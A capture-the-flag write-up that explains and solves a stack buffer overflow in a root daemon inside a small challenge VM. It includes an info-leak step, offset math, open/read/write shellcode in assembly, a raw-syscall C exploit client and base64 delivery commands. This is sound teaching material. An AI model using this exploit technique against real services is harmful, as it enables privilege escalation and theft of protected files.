# WRITEUP — Overflow the IPC (`overipc-player`)

- **Challenge category:** pwn / stack buffer overflow (root daemon inside a tiny VM)
- **Difficulty:** medium
- **Flag:** `fahemsec{0v3rfl0w_th3_1pc_w1n_r00t}`
- **Artifacts:** `bzImage`, `initramfs.cpio.gz`, `overipc_server`, `Dockerfile`, `docker-compose.yml`, `run.sh`
- **Remote service:** instanced `ncat --ssl <host> 443` (qemu serial console over socat)
- **Runtime:** the whole challenge is a tiny x86-64 Linux VM. At boot, a daemon called
  `/overipc_server` starts **as root**, listens on a UNIX socket `/tmp/.overipc.sock`,
  and `init` drops us to a normal unprivileged shell (`ctf`).

---

## 1. TL;DR (30-second summary)

A small Linux "virtual machine" boots and runs a chatty little server (`overipc_server`)
**as the root user**. It waits for anyone to connect to its private phone line (a UNIX
socket at `/tmp/.overipc.sock`) and reply to its messages. We are a normal guest user
(`ctf`) — we can connect to that phone line, but we don't have permission to read the
flag file.

The server has a bug: when we send it a certain kind of message ("command 2"), it copies
our message into a small workspace on its **stack** (a scratchpad in memory) without
checking how big our message is. If we send more data than the workspace can hold, the
extra bytes spill over and overwrite the server's own "what to do next" memory. That is
the **stack overflow**.

We use that bug in three moves:

1. **Peek at the server's memory** — the buggy message also lets us read a few leftover
   bytes of the server's own memory. That tells us exactly where its workspace is in
   memory (this defeats "ASLR", the OS trick that randomly shuffles memory addresses).
2. **Plant a tiny program** — we overflow the workspace and overwrite the server's
   "what to do next" pointer so that, when the message handler returns, the server
   starts running *our* machine code instead.
3. **Read the flag** — our machine code is short: *open the file `/flag`, read it, and
   send its contents back over our phone line*. Because the server runs as root, it is
   allowed to open the flag file, and because its keyboard/screen (its standard output)
   is wired to our connection, the flag text flows straight back to us.

The only practical complication is that the VM is tiny and ships no compiler or UNIX-socket
tool, so we bring our own: a ~9 KB program we compile on our own machine, turn into plain
text (base64), paste into the VM console, decode, and run.

---

## 2. Plain-English explanation (for non-technical readers)

### What is a daemon, and why is it "as root"?

A **daemon** is a background program that runs by itself and waits for other programs to
talk to it. Think of the challenge like a **bank vault**:

- The vault is the file `/flag`.
- The security guard is `overipc_server`. The guard has the master key because he runs
  as **root** (the administrator of the machine).
- When the computer starts, the guard sets up at his front desk: a phone line
  (the UNIX socket). Then the computer gives *us* a normal, low-privilege shell — we are
  a guest with no key.
- The guard's only job is to answer phone calls. He has three standard replies:
  - message "1" → he answers "PONG" (a ping/pong test),
  - message "3" → he answers with his version number,
  - message "2" → he *echoes* whatever you say back at you (like a walkie-talkie that
    repeats your words),
  - anything else → "ERR".

That "echo" message (command 2) is the dangerous one.

### What is a stack, and what is a buffer overflow?

Programs keep track of where they are in memory using a **stack** — imagine a stack of
paper on a desk. When a function runs, it places its own notepad on top of the pile.
Among the notes on that notepad are **"where do I go next?"** (the *return address*): a
reminder of which line to resume after this function finishes.

When the guard receives an "echo" message, he copies the caller's words into a small
notepad that is exactly **64 characters** big. The bug: he **never counts** how many
characters were sent. If a caller shouts a 200-character message, he keeps writing past
the edge of the notepad, spilling onto the notes below — including the "where do I go
next?" note.

So an attacker can write whatever they want onto that note. When the function finishes
and reads the note to decide what to do next, it will jump to *our* choice instead of the
guard's normal next step. That's the essence of a **stack buffer overflow**.

### What is shellcode?

If we can control "where do I go next?", we can make the program jump into the middle of
our own message and start executing the bytes we sent as if they were machine code. A
small blob of machine code that does something useful is called **shellcode**. Our
shellcode is 69 bytes and does exactly three system calls:

1. `open("/flag")` — ask the operating system to open the flag file,
2. `read(...)` — read its contents into memory,
3. `write(1, ...)` — write those contents out.

The genius of the setup: the guard has his keyboard and screen (standard output, fd 1)
**wired directly to our phone line** (the server does `dup2` on the accepted connection).
So when our shellcode writes to "standard output", it is literally sending the flag to us.
No second connection, no shell needed.

### Why do we need a "leak" first? (What is ASLR?)

Modern operating systems defend against exactly this trick by shuffling memory around
randomly on every run (this is called **ASLR**). If we don't know *where* our message
lands in memory, we can't point "where do I go next?" at it.

But the echo bug gives us a gift: when the guard echoes our message, he sends back
**exactly the number of characters we asked for** — even if he only actually received
fewer. In other words, if we ask for a 80-character echo but only shout 64 characters,
he fills the remaining 16 characters with **leftover scraps from his own notepad**, and
sends those scraps to us. Among the scraps is the memory address of his own desk
(his "frame pointer"). From that one number we can compute exactly where our message
will sit in memory — no guessing. ASLR defeated.

### Why do we paste a program into the console?

The VM deliberately ships almost nothing: no compiler, no Python, and its `nc` tool
can't talk to UNIX sockets. We could not even *connect* to the guard's phone line with
the built-in tools! So we do the standard trick: we compile a tiny client program on our
own machine (about 9 KB), convert it to text with `base64`, paste that text into the VM
console, decode it back to a file with the VM's `base64 -d`, make it executable, and run
it. The program does the whole attack automatically: connect → leak → overflow → print
flag.

---

## 3. Technical analysis

### 3.1 Binary properties

```
$ file overipc_server
overipc_server: ELF 64-bit LSB executable, x86-64, statically linked, not stripped

Protections:
  PIE    : Off  (fixed addresses)
  NX     : Off  (GNU_STACK is RWE → the stack is executable → shellcode works)
  Canary : Present in libc functions, but NOT in handle_message/main (the buggy path)
  RELRO  : Partial
```

Key facts:
- **Statically linked, no PIE** — all code/data addresses are fixed, which simplifies
  everything.
- **NX disabled** (`readelf -lW | grep GNU_STACK` → `RWE`) — the kernel marks the stack
  executable, so we can jump to our shellcode on the stack directly. No ROP needed.
- **No stack canary** in `handle_message` — there is no cookie that would detect our
  overflow (canaries only exist in library functions, which we never reach).

### 3.2 The init / startup script

`init` (inside the initramfs):

```sh
chmod 600 /flag; chown 0.0 /flag          # flag is root-only
while true; do /overipc_server; done &    # daemon as root, restarted if it dies
...
exec setsid /bin/sh -c 'exec su -l ctf 2>/dev/null'   # we land here as user "ctf"
```

### 3.3 Reversed code (`handle_message`)

```
recv(fd, &cmd, 4);          if (n != 4) return;
recv(fd, &len, 4);          if (n != 4) return;
switch (cmd) {
  case 1: send(fd, "PONG", 4);                       break;
  case 2: recv(fd, buf, len);   send(fd, buf, len);  break;   // <-- BUG
  case 3: send(fd, "overipc v1.0", 12);              break;
  default: send(fd, "ERR", 3);                       break;
}
```

- The stack buffer `buf` lives at `rbp - 0x40` (64 bytes) in a frame of size `0x60`.
- `case 2` calls `recv(fd, buf, len)` with **no upper bound on `len`** → classic stack
  overflow. No canary in this function (`objdump` shows no `fs:0x28` reference here).
- `send(fd, buf, len)` re-sends **`len` bytes** even when `recv` returned fewer → an
  **info leak** of whatever stack bytes follow the 64-byte buffer.
- `main` does, after each `accept()`: `dup2(fd, 1); dup2(fd, 2);` — the client socket is
  the daemon's stdout/stderr. That is what lets our shellcode's `write(1,...)` reach us.

### 3.4 Frame layout (offset math)

When `main` calls `handle_message`, `rsp = main_rbp - 0x90`; after `call` + `push rbp`:

```
handle_rbp = main_rbp - 0xA0
buf        = handle_rbp - 0x40 = main_rbp - 0xE0
saved rbp  = handle_rbp        (leaked value == main_rbp)
saved rip  = handle_rbp + 8    (== 0x401b7e, main+...)
payload[0x40] → overwrites saved rbp
payload[0x48] → overwrites saved rip   ← our shellcode address
payload[0x50] → start of shellcode     (== main_rbp - 0x90, inside main's frame)
```

So `shellcode_address = leaked_main_rbp - 0x90`. Our shellcode is 69 bytes, well under
the 0x90 bytes of main's frame we can overwrite without touching main's own saved rbp/rip.

---

## 4. Exploitation

### 4.1 Step 1 — Leak a stack address

```
send: cmd=2 (4 bytes)  len=0x50 (4 bytes)  'A'*0x40
recv: 0x50 bytes = 0x40 'A's + [saved rbp (8)] + [saved rip (8)]
main_rbp = u64(leak[0x40:0x48])
shell_addr = main_rbp - 0x90
```

Why `recv` on the daemon side returns only 0x40: `recv` returns whatever is available
(up to the requested length). We only sent 0x40 bytes, so the buffer holds 0x40 real
bytes plus 0x10 bytes of uninitialized stack — and the daemon then echoes all 0x50.

### 4.2 Step 2 — Overflow and run shellcode

```
payload = 'B'*0x40  +  p64(0)  +  p64(shell_addr)  +  shellcode
len     = 0x40 + 8 + 8 + len(shellcode)
```

When `handle_message` returns, `leave; ret` pops our fake rbp, then jumps to
`shell_addr` where our shellcode begins:

```
endbr64                     # (harmless, in case CET/IBT checks indirect targets)
movabs rax, 0x67616c662f; push rax   # stack string "/flag\0"
mov rdi, rsp                         # path pointer
xor rsi, rsi; xor rdx, rdx; mov al,2; syscall   # open("/flag", O_RDONLY)
mov rdi, rax; mov rsi, rsp; mov dx, 0x4000; xor eax,eax; syscall  # read
mov rdx, rax; mov eax,1; mov edi,1; syscall      # write(1, buf, n)  → flag to us
mov eax,60; xor edi,edi; syscall                  # exit
```

### 4.3 The client (tiny `-nostdlib` static binary)

The VM has no compiler and its `nc` cannot do UNIX sockets, so we build a ~9 KB client
with raw syscalls only (`-nostdlib -static -Os -s`), whose core is:

```c
// sc() = raw syscall helper:  sc(n, a, b, c, d, e, f) → syscall n
static long conn(void){
  long fd = sc(41, 1, 1, 0,0,0,0);          // socket(AF_UNIX, SOCK_STREAM)
  char s[110] = {0}; s[0]=1;                 // sockaddr_un, family AF_UNIX
  memcpy(s+2, "/tmp/.overipc.sock", 18);
  sc(42, fd, (long)s, 110,0,0,0);            // connect
  return fd;
}

void _start(void){
  // ---- leak ----
  long fd = conn();
  uint cmd = 2, len = 0x50;
  send_all(fd, (char*)&cmd, 4);  send_all(fd, (char*)&len, 4);
  char leak[0x50];  memset(leak, 'A', 0x40);
  send_all(fd, leak, 0x40);
  recv_full(fd, leak, 0x50);
  ulong shell = *(ulong*)(leak + 0x40) - 0x90;   // main_rbp - 0x90
  sc(3, fd, 0,0,0,0,0);                          // close

  // ---- overflow ----
  fd = conn();
  int n = 0x40 + 8 + 8 + SC_LEN;
  char payload[0x200];
  memset(payload, 'B', 0x40);
  *(ulong*)(payload+0x40) = 0;
  *(ulong*)(payload+0x48) = shell;
  memcpy(payload+0x50, shellcode, SC_LEN);
  cmd = 2;  len = n;
  send_all(fd, (char*)&cmd, 4);  send_all(fd, (char*)&len, 4);
  send_all(fd, payload, n);

  recv_full(fd, echo, n);              // consume the echo
  // keep reading; the daemon's shellcode writes the flag to fd 1 (= our socket)
  ...
  write(1, out, tot);                  // print the flag to the console
}
```

The shellcode bytes are generated by a small Python function (assembles
`open/read/write(1)` for an arbitrary path) and injected into the C source before
compiling.

### 4.4 Delivery into the VM

```
~ $ cat > /tmp/e.b64 <<'EOF'
<~9.7 KB of base64, split into 76-char lines~>
EOF
~ $ base64 -d /tmp/e.b64 > /tmp/e
~ $ chmod +x /tmp/e
~ $ /tmp/e
```

### 4.5 Verification in the local VM

Booted with the provided `run.sh` parameters
(`qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio.gz -nographic -append "console=ttyS0 nokaslr quiet"`).
The bundled initramfs only holds a **placeholder** flag:

```
~ $ /tmp/e
fahemsec{run_this_on_remote_server}
```

### 4.6 Actual successful run against the remote

```
~ $ base64 -d /tmp/e.b64 > /tmp/e
~ $ chmod +x /tmp/e
~ $ /tmp/e
Segmentation fault
fahemsec{0v3rfl0w_th3_1pc_w1n_r00t}~ $
```

The `Segmentation fault` is the daemon (rightfully) crashing after our overflow — but not
before our shellcode opened `/flag`, read it, and pushed the contents back to us over the
socket.

---

## 5. Flag

```
fahemsec{0v3rfl0w_th3_1pc_w1n_r00t}
```

---

## 6. Lessons

- **Check the length of everything you copy.** One missing bounds check in a `recv` was
  the entire vulnerability. The daemon even leaks a stack address for free because its
  echo re-sends the requested length regardless of how much was actually read.
- **No canary + NX off + no PIE = trivial ret2stack.** The absence of a stack canary in
  the vulnerable function and an executable stack (`GNU_STACK` RWE) meant a 69-byte
  shellcode was enough; no ROP chains or complex gadgets were needed.
- **`dup2(fd, 1)` turns "print to stdout" into "send to the client".** A very common and
  very convenient property of socket servers — one `write(1, ...)` in the shellcode is
  enough to exfiltrate data.
- **Leak before you jump.** Even with every other mitigation off, ASLR is still on; the
  tiny info leak (read `len`, receive `len` bytes with 0x10 of stale stack) converted the
  exploit from a guess into a one-shot.
- **Bring your own tools.** Minimal initramfs VMs often lack compilers and socket clients;
  a tiny `-nostdlib` static binary delivered via base64 is the universal answer.
